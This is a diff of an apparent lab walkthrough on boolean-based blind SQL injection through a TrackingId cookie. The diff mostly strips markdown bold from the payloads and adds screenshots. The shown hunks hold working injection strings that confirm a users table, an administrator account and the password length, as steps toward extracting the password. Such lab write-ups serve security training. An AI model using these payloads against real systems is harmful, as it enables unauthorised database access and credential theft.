@@ -22,7 +22,7 @@ TrackingId=xyz
 Modify it to:
 
 ```sql
-**TrackingId=xyz' AND 1=1--**
+TrackingId=xyz' AND 1=1--
 ```
 
 ### SQL Example
@@ -65,7 +65,7 @@ Welcome back
 Now send:
 
 ```sql
-**TrackingId=xyz' AND 1=2--**
+TrackingId=xyz' AND 1=2--
 ```
 
 The SQL becomes:
@@ -98,7 +98,7 @@ This confirms that the application's response changes based on the truth of the 
 Payload:
 
 ```sql
-**TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--**
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
 ```
 
 ### Explanation
@@ -136,7 +136,7 @@ If the table didn't exist, the query would fail or evaluate as false.
 Payload:
 
 ```sql
-**TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--**
+TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
 ```
 
 If a row exists where:
@@ -146,7 +146,7 @@ And another payload:
 Payload:
 
 ```sql
-**TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--**
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
 ```
 
 If a row exists where:
@@ -184,8 +184,8 @@ appears.
 Start with:
 
 ```sql
-**TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
-AND LENGTH(password)>1)='a'--**
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
+AND LENGTH(password)>1)='a'--
 ```
 
 Suppose the password is:
@@ -336,8 +336,8 @@ Instead:
 You get:
 
 ```
-**TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
-AND LENGTH(password)>**§**1**§**)='a'--**
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
+AND LENGTH(password)>**§**1**§**)='a'--
 
 ```
 
@@ -363,6 +363,13 @@ Add:
 This covers digits.
 
 1. Number Range: from- 1 to 25 & Step 1
+
+
+<img width="1276" height="768" alt="Screenshot 2026-08-08 at 8 59 28 PM" src="https://github.com/user-attachments/assets/c550d829-e43c-4091-8201-360f254abff3" />
+<img width="1278" height="768" alt="Screenshot 2026-08-08 at 8 59 07 PM" src="https://github.com/user-attachments/assets/a0933ebe-c2cc-403f-a0f2-26316dfb0384" />
+
+
+
 
 # Step 9: Extract the Password
 
